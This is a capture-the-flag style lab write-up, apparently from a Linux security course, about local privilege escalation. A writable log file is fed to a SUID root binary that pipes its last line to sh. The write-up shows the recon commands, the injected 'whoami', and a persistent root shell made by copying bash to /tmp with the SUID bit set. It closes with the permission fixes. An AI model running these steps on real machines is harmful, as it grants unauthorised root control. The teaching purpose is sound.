# Step 1: Reconnaissance

Let's do some basic reconnaissance! Try a few things with tempuser to get a feeling of what you can and can't do:

    - can you execute sudo commands?
      - tempuser is not in the sudoers file.
    - in what groups is tempuser?
      - uid=1001(tempuser) gid=1001(tempuser) groups=1001(tempuser),1002(logadmin)
    - what kind of file do you have write access to?
      - find / -type f -writable 2>/dev/null | grep -v -E "^/(proc|sys|dev)"
      - /var/log/mylog.log
  
# Step 2: An Interesting File

That last question should have pointed you to a file that looks a bit out of place (hint: it's not in /proc).

What are the permissions of that file? With a quick glance, what seems to be its content?

`-rw-rw-r-- 1 root logadmin 67541 Apr 22  2025 /var/log/mylog.log`

Now let's see if we can find where this file is used. Find a command that search for mention of this interesting file in other files (could be scripts, binaries, configuration...). We'll help you a bit to narrow the search so it doesn't take too long: you should look in /usr.

```
tempuser@26d5433618bb:/$ grep -r "/var/log/mylog.log" /usr 2>/dev/null
tempuser@26d5433618bb:/$ grep -rla "/var/log/mylog.log" /usr 2>/dev/null
/usr/local/bin/logwriter
```

# Step 2b: Making Linpeas Work

We guided you through manual reconnaissance so you can have a taste of what it looks like, but Linpeas would have done the work just fine.

Download the latest release and execute it to see if you can find the two interesting files you spotted manually (there will be a lot more that Linpeas flags as interesting, but we'll ignore that for this exercise).

```
wget http://host.docker.internal:9999/linpeas.sh
┌──(cchopin ℍ HackBookPro)-[~/projets-git/Jedha-cybersec-fullstack/08_linux_system_security] (main)
└─$ python3 -m http.server 9999 --bind 0.0.0.0
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
127.0.0.1 - - [21/Jan/2026 11:03:12] "GET /linpeas.sh HTTP/1.1" 200 -
```

# Step 3: Figuring it Out

You know should have found an executable that uses our writable file, but you don't know yet how. We'll go into more details about executables tomorrow, so let's help you a bit here. To understand what's happening, you can:

    simply run the executable: you should get an error of some sort.
    that error should give you an idea of another process the executable is trying to call
    can you find the command in the executable's strings?


```
tempuser@26d5433618bb:/tmp$ strings /usr/local/bin/logwriter | grep -E "(sh|log|/var|/bin)"
/var/log/alternatives.log
/var/log/bootstrap.log
/var/log/mylog.log
tail -n 1 %s | sh
logwriter.c
source_logs
.shstrtab
.gnu.hash
```

# Step 4: Exploiting the Flaw

There's something interesting about the executable, have you looked at its permission? Try executing a privileged command to see what happens.

Can you make the exploit more permanents and add yourself to sudoers?

```
tempuser@26d5433618bb:/tmp$ echo "whoami" >> /var/log/mylog.log
tempuser@26d5433618bb:/tmp$ /usr/local/bin/logwriter
Executing...
root
```

```
tempuser@26d5433618bb:/tmp$ echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" >> /var/log/mylog.log
/usr/local/bin/logwriter
/tmp/rootbash -p
Executing...
rootbash-5.2# id
uid=1001(tempuser) gid=1001(tempuser) euid=0(root) groups=1001(tempuser),1002(logadmin)
rootbash-5.2#
```

# Step 5: Fixing it

What were the two issues that lead you to escalate your privileges? Can you try to fix them? You might notice that the permissions on the writable file are a bit more complex than anticipated...

```
# Retirer le write au groupe
chmod g-w /var/log/mylog.log

# Vérifier
ls -l /var/log/mylog.log
-rw-r--r-- 1 root logadmin 405316 Jan 21 10:18 /var/log/mylog.log

# Retirer le bit SUID
chmod u-s /usr/local/bin/logwriter

# Vérifier
ls -l /usr/local/bin/logwriter
-rwxr-xr-x 1 root root 71152 Apr 22  2025 /usr/local/bin/logwriter
```
